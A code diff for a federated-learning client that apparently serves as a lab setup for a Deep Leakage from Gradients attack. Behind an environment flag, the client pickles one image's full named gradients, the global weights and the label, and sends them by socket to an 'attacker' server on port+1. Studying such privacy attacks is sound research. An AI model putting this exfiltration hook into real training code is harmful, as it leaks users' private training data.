@@ -69,36 +69,50 @@ def main():
             # --- One-shot DLG leak (full parameter gradients for ONE image) ---
             if os.environ.get("LEAK_DLG_ONCE") == "1":
                 try:
+                    # Rebuild model at current global weights (W_k)
                     model = SmallCNN(pretrained=False)
                     model.load_state_dict(state_dict)
-                    model.to(device).train()
+                    model.to(device).train()  # IMPORTANT: train() to match single-sample behavior
 
-                    x, y = next(iter(loader))      # batch
-                    x0, y0 = x[:1].to(device), y[:1].to(device)  # ONE sample (batch size = 1)
+                    # Take ONE sample so batch size = 1
+                    x, y = next(iter(loader))
+                    x0, y0 = x[:1].to(device), y[:1].to(device)
 
+                    # Compute loss and FULL gradient over ALL parameters (batch=1)
                     model.zero_grad()
                     logits = model(x0)
                     loss = F.cross_entropy(logits, y0)
-                    grads = torch.autograd.grad(loss, model.parameters(), create_graph=False)
+
+                    # Compute grads and keep them **by parameter name**
+                    params = [p for p in model.parameters()]
+                    grads = torch.autograd.grad(loss, params, create_graph=False)
+
+                    names = [n for n, _ in model.named_parameters()]
+                    grads_by_name = {names[i]: grads[i].detach().cpu().float() for i in range(len(names))}
+
+                    # Also send the exact weights (CPU tensors) so attacker uses same W_k
+                    state_cpu = {k: v.detach().cpu() for k, v in state_dict.items()}
 
                     payload = {
-                        "grads": [g.detach().cpu() for g in grads],
-                        "label": int(y0.item()),
-                        "state_dict": {k: v.detach().cpu() for k, v in state_dict.items()},
+                        "grads_by_name": grads_by_name,
+                        "state_dict": state_cpu,
+                        "label": int(y0.item()),  # optional, not used by DLG
                     }
                     data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)
 
+                    # Send to attacker on (port+1), e.g., 12346
                     atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     atk.settimeout(5.0)
-                    atk.connect((args.host, args.port + 1))     # attack server is port+1
+                    atk.connect((args.host, args.port + 1))
                     atk.sendall(len(data).to_bytes(8, "big"))
                     atk.sendall(data)
                     atk.close()
-                    print("[client] leaked FULL gradient for 1 image (DLG) to attacker", flush=True)
+                    print("[client] leaked FULL gradient (named) for 1 image (DLG) to attacker", flush=True)
                 except Exception as e:
                     print(f"[client] DLG leak failed: {e}", flush=True)
                 finally:
-                    os.environ["LEAK_DLG_ONCE"] = "0"  # only once
+                    os.environ["LEAK_DLG_ONCE"] = "0"
+
 
             print(f"[client] received W_k ({_count_params(state_dict):,} params). training 1 local epoch…", flush=True)
 
